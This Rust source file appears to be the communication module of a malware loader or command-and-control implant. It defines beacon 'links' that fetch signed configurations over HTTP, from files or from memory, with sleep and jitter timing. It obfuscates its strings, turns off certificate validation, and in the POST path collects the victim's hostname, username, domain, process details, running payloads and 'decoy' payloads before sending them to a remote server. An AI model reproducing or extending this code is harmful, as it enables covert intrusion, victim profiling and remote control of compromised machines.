use crate::config::CCC;
use crate::dataoperation::{apply_all_dataoperations, DO, UnApplyDataOperation};
use crate::link_util::bytes_to_gigabytes_string;
use crate::link_util::cmdline;
use crate::link_util::get_domain_name;
use crate::link_util::process_name_and_parent;
use crate::link_util::process_path;
use crate::link_util::working_dir;
use crate::poollink::Advanced;
use crate::rundata::RunData;
use crate::link_util::read_file;
use crate::memory::access_memory;

use anyhow::bail;
use anyhow::Result;
use rand::Rng;
use ring::signature::{self, KeyPair};
use serde::{Deserialize, Serialize};
use std::io::Read;
use std::process;
use std::time::Duration;
use std::{thread, time};
use sysinfo::System;
//use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
use attohttpc::header;

use cryptify::encrypt_string;
use log::debug;
use log::info;



#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub enum Lk {
    #[serde(rename = "hh")]
    HTTP(HHH),
    #[serde(rename = "dd")]
    DNS(DDD),
    #[serde(rename = "ff")]
    FILE(FFF),
    #[serde(rename = "me")]
    MEMORY(MMM),
    #[serde(rename = "hhp")]
    HTTPP(HHHP),
}
impl Lk {
    pub fn print_link_compact(&self) {
        info!("{:?}", serde_json::to_string(self).unwrap_or_default());
    }

    pub fn fetch_config(
        &self,
        config: &CCC,
        advanced: &Advanced,
        link_nb: i32,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
    ) -> Result<CCC, anyhow::Error> {
        let result = self.fetch_data_with_post(session_id, run_data, config);
        let data: Vec<u8> = match result {
            Ok(data) => data,
            Err(error) => bail!(
                "{}{}{}{}",
                encrypt_string!("link "),
                link_nb,
                encrypt_string!(" fetch_data() error: "),
                error
            ),
        };
        debug!("{}", encrypt_string!("deserialized data"));
        let newconfig: CCC = match serde_json::from_slice(&data) {
            Ok(newconfig) => newconfig,
            Err(error) => bail!(
                "{}{}{}{}",
                encrypt_string!("link "),
                link_nb,
                encrypt_string!(" deserialized data error: "),
                error
            ),
        };
        match config.verify_newconfig_signature(&newconfig) {
            Ok(()) => (),
            _unspecified => {
                bail!(
                    "{}{}{}",
                    encrypt_string!("link "),
                    link_nb,
                    encrypt_string!(" config signature: verify FAIL")
                )
            }
        }
        if advanced.accept_old == false {
            if config.date > newconfig.date {
                bail!(
                    "{}{}{}",
                    encrypt_string!("link "),
                    link_nb,
                    encrypt_string!(" config date: TOO OLD")
                )
            }
        };
        info!(
            "{}{}{}",
            encrypt_string!("link "),
            link_nb,
            encrypt_string!(" config signature: VERIFIED")
        );
        Ok(newconfig)
    }
}

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct HHH {
    #[serde(rename = "u")]
    pub url: String,
    #[serde(rename = "do")]
    pub dataoperation: Vec<DO>,
    #[serde(rename = "s")]
    pub sleep: u64,
    #[serde(rename = "j")]
    pub jitt: u64,
}
#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct DDD {
    #[serde(rename = "d")]
    pub dns: String,
    #[serde(rename = "do")]
    pub dataoperation: Vec<DO>,
    #[serde(rename = "s")]
    pub sleep: u64,
    #[serde(rename = "j")]
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct FFF {
    #[serde(rename = "f")]
    pub file_path: String,
    #[serde(rename = "do")]
    pub dataoperation: Vec<DO>,
    #[serde(rename = "s")]
    pub sleep: u64,
    #[serde(rename = "j")]
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct MMM {
    #[serde(rename = "mnb")]
    pub memory_nb: i32,
    #[serde(rename = "do")]
    pub dataoperation: Vec<DO>,
    #[serde(rename = "s")]
    pub sleep: u64,
    #[serde(rename = "j")]
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct HHHP {
    #[serde(rename = "u")]
    pub url: String,
    #[serde(rename = "do")]
    pub dataoperation: Vec<DO>,
    #[serde(rename = "")]
    pub dataoperation_post: Vec<DO>,
    #[serde(rename = "s")]
    pub sleep: u64,
    #[serde(rename = "j")]
    pub jitt: u64,
}

pub trait LinkFetch {
    fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error>;
    fn download_data_post(
        &self,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
        config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error>;
    fn get_target(&self) -> String;
    fn get_dataoperation(&self) -> Vec<DO>;
    fn get_sleep(&self) -> u64;
    fn get_jitt(&self) -> u64;

    fn sleep_and_jitt(&self) {
        let mut rng: rand::prelude::ThreadRng = rand::thread_rng();
        let random_number: f64 = rng.gen();

        let jitt = (self.get_jitt() as f64) * random_number;
        let total_sleep = (self.get_sleep() as f64) + jitt;
        if total_sleep != 0.0 {
            info!("{}{}", encrypt_string!("sleep: "), total_sleep);
        };
        let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
        thread::sleep(sleep_time);
    }

    fn un_apply_all_dataoperations(&self, mut data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        for operation in self.get_dataoperation() {
            data = operation.un_apply_one_operation(data)?;
        }
        Ok(data)
    }



    fn fetch_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data = self.download_data(config)?;
        self.un_apply_all_dataoperations(data)
    }

    fn fetch_data_with_post(
        &self,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
        config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data = self.download_data_post(session_id, run_data, config)?;
        self.un_apply_all_dataoperations(data)
    }
}

impl LinkFetch for Lk {
    fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            Lk::HTTP(link) => link.download_data(config),
            Lk::DNS(link) => link.download_data(config),
            Lk::FILE(link) => link.download_data(config),
            Lk::MEMORY(link) => link.download_data(config),
            Lk::HTTPP(link) => link.download_data(config),
        }
    }

    //TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/
    fn download_data_post(
        &self,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
        config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            Lk::HTTP(link) => link.download_data(config),
            Lk::DNS(link) => link.download_data(config),
            Lk::FILE(link) => link.download_data(config),
            Lk::MEMORY(link) => link.download_data(config),
            Lk::HTTPP(link) => link.download_data_post(session_id, run_data, config),
        }
    }

    fn get_target(&self) -> String {
        match &self {
            Lk::HTTP(link) => link.get_target(),
            Lk::DNS(link) => link.get_target(),
            Lk::FILE(link) => link.get_target(),
            Lk::MEMORY(link) => link.get_target(),
            Lk::HTTPP(link) => link.get_target(),
        }
    }
    fn get_dataoperation(&self) -> Vec<DO> {
        match &self {
            Lk::HTTP(link) => link.get_dataoperation(),
            Lk::DNS(link) => link.get_dataoperation(),
            Lk::FILE(link) => link.get_dataoperation(),
            Lk::MEMORY(link) => link.get_dataoperation(),
            Lk::HTTPP(link) => link.get_dataoperation(),
        }
    }

    fn get_sleep(&self) -> u64 {
        match &self {
            Lk::HTTP(link) => link.get_sleep(),
            Lk::DNS(link) => link.get_sleep(),
            Lk::FILE(link) => link.get_sleep(),
            Lk::MEMORY(link) => link.get_sleep(),
            Lk::HTTPP(link) => link.get_sleep(),
        }
    }
    fn get_jitt(&self) -> u64 {
        match &self {
            Lk::HTTP(link) => link.get_jitt(),
            Lk::DNS(link) => link.get_jitt(),
            Lk::FILE(link) => link.get_jitt(),
            Lk::MEMORY(link) => link.get_jitt(),
            Lk::HTTPP(link) => link.get_jitt(),
        }
    }
}

impl LinkFetch for FFF {
    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        read_file(&self.get_target())
    }
    fn download_data_post(
        &self,
        _session_id: &String,
        //running_thread: &Vec<Payload>,
        _run_data: &RunData,
        _config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.file_path)
    }
    fn get_dataoperation(&self) -> Vec<DO> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for MMM {
    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        access_memory(self.memory_nb)
    }
    fn download_data_post(
        &self,
        _session_id: &String,
        //running_thread: &Vec<Payload>,
        _run_data: &RunData,
        _config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}{}", encrypt_string!("MEMORY_"), self.memory_nb)
    }
    fn get_dataoperation(&self) -> Vec<DO> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for DDD {
    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }
    fn download_data_post(
        &self,
        _session_id: &String,
        //running_thread: &Vec<Payload>,
        _run_data: &RunData,
        _config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.dns)
    }
    fn get_dataoperation(&self) -> Vec<DO> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for HHH {
    fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        let build: attohttpc::RequestBuilder = attohttpc::get(&self.get_target())
            .danger_accept_invalid_certs(true)
            .header(header::USER_AGENT, &config.link_user_agent)
            .timeout(Duration::from_secs(config.link_timeout));
        let mut response = build.send()?;
        let mut body: Vec<u8> = Vec::new();
        response.read_to_end(&mut body)?;
        Ok(body)
    }
    fn download_data_post(
        &self,
        _session_id: &String,
        //running_thread: &Vec<Payload>,
        _run_data: &RunData,
        _config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.url)
    }
    fn get_dataoperation(&self) -> Vec<DO> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}


#[derive(Serialize, Deserialize, PartialEq, Clone)]
pub struct HHCC {
    #[serde(rename = "a")]
    pub session_id: String,
    #[serde(rename = "b")]
    pub hostname: String,
    #[serde(rename = "c")]
    pub username: String,
    #[serde(rename = "d")]
    pub domain: String,
    #[serde(rename = "e")]
    pub arch: String,
    #[serde(rename = "f")]
    pub distro: String,
    #[serde(rename = "g")]
    pub desktop_env: String,
    #[serde(rename = "h")]
    pub cmdline: String,
    #[serde(rename = "i")]
    pub working_dir: String,
    #[serde(rename = "j")]
    pub process_path: String,
    #[serde(rename = "k")]
    pub process_name: String,
    #[serde(rename = "l")]
    pub pid: u32,
    #[serde(rename = "m")]
    pub parent_name: String,
    #[serde(rename = "gh")]
    pub ppid: u32,
    #[serde(rename = "t")]
    pub total_memory: String,
    #[serde(rename = "u")]
    pub used_memory: String,
    #[serde(rename = "v")]
    pub nb_cpu: usize,
    #[serde(rename = "w")]
    pub data_operation: Vec<DO>,
    //pub running_thread: Vec<String>,
    #[serde(rename = "x")]
    pub running_thread_payload: Vec<String>,
    #[serde(rename = "y")]
    pub runonce_payload: Vec<String>,
    #[serde(rename = "z")]
    pub running_thread_decoy_update: Vec<String>,
    #[serde(rename = "du")]
    pub runonce_decoy_update: Vec<String>,
    #[serde(rename = "da")]
    pub running_thread_decoy_payload: Vec<String>,
    #[serde(rename = "dl")]
    pub runonce_decoy_payload: Vec<String>,
    #[serde(rename = "pb")]
    pub peer_public_key_bytes : Vec<u8>,
    #[serde(rename = "sb")]
    pub sign_bytes: Vec<u8>,
}

impl LinkFetch for HHHP {
    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }
    fn download_data_post(
        &self,
        session_id: &String,
        //running_thread: &Vec<Payload>,
        run_data: &RunData,
        config: &CCC,
    ) -> Result<Vec<u8>, anyhow::Error> {


        let mut running_thread_payload: Vec<String> = vec![];
        for (_thread,payload_list) in &run_data.running_thread_payload {
            running_thread_payload.push(payload_list.string_payload_compact());
        }
        let mut runonce_payload: Vec<String> = vec![];
        for payload_list in &run_data.runonce_payload {
            runonce_payload.push(payload_list.string_payload_compact());
        }
        let mut running_thread_decoy_update: Vec<String> = vec![];
        for (_thread,payload_list) in &run_data.running_thread_decoy_update {
            running_thread_decoy_update.push(payload_list.string_payload_compact());
        }
        let mut runonce_decoy_update: Vec<String> = vec![];
        for payload_list in &run_data.runonce_decoy_update {
            runonce_decoy_update.push(payload_list.string_payload_compact());
        }
        let mut running_thread_decoy_payload: Vec<String> = vec![];
        for (_thread,payload_list) in &run_data.running_thread_decoy_payload {
            running_thread_decoy_payload.push(payload_list.string_payload_compact());
        }
        let mut runonce_decoy_payload: Vec<String> = vec![];
        for payload_list in &run_data.runonce_decoy_payload {
            runonce_decoy_payload.push(payload_list.string_payload_compact());
        }



        let key_pair: signature::Ed25519KeyPair =
            match signature::Ed25519KeyPair::from_pkcs8(config.loader_keypair.as_ref()) {
                Ok(key_pair) => key_pair,
                Err(error) => bail!("{}{}", encrypt_string!("loader_keypair use: "), error),
            };
        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();

        let sys: System = System::new_all();
        let (process_name, parent_name, ppid) = process_name_and_parent(&sys);
        let process_path = process_path();

        let mut post_data: HHCC = HHCC {
            session_id: session_id.to_string(),
            hostname: whoami::devicename(),
            username: whoami::username(),
            domain: get_domain_name(),
            arch: whoami::arch().to_string(),
            distro: whoami::distro(),
            desktop_env: whoami::desktop_env().to_string(),
            pid: process::id(),
            ppid: ppid,
            process_name: process_name,
            process_path: process_path,
            working_dir: working_dir(),
            cmdline: cmdline(),
            parent_name: parent_name,
            total_memory: bytes_to_gigabytes_string(sys.total_memory()),
            used_memory: bytes_to_gigabytes_string(sys.used_memory()),
            nb_cpu: sys.cpus().len(),
            data_operation: self.dataoperation.clone(),
            running_thread_payload: running_thread_payload,
            //TODO
            runonce_payload: runonce_payload,
            running_thread_decoy_update: running_thread_decoy_update,
            runonce_decoy_update: runonce_decoy_update,
            running_thread_decoy_payload: running_thread_decoy_payload,
            runonce_decoy_payload: runonce_decoy_payload,

            peer_public_key_bytes: peer_public_key_bytes.clone(),
            sign_bytes: vec![],
        };

        let sign_data = format!("{}", serde_json::to_string(&post_data).unwrap_or_default());
        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
        let sign_bytes = sig.as_ref().to_vec();
        post_data.peer_public_key_bytes = peer_public_key_bytes;
        post_data.sign_bytes = sign_bytes;

        let post_data_bytes = serde_json::to_vec(&post_data)?;
        let m: Vec<u8> =
            apply_all_dataoperations(&mut self.dataoperation_post.clone(), post_data_bytes)?;

        let build = attohttpc::post(&self.get_target())
            .danger_accept_invalid_certs(true)
            .header(header::USER_AGENT, &config.link_user_agent)
            .timeout(Duration::from_secs(config.link_timeout))
            .bytes(m);
        let mut response = build.send()?;
        let mut body: Vec<u8> = Vec::new();
        response.read_to_end(&mut body)?;
        Ok(body)
    }

    fn get_target(&self) -> String {
        format!("{}", self.url)
    }
    fn get_dataoperation(&self) -> Vec<DO> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}
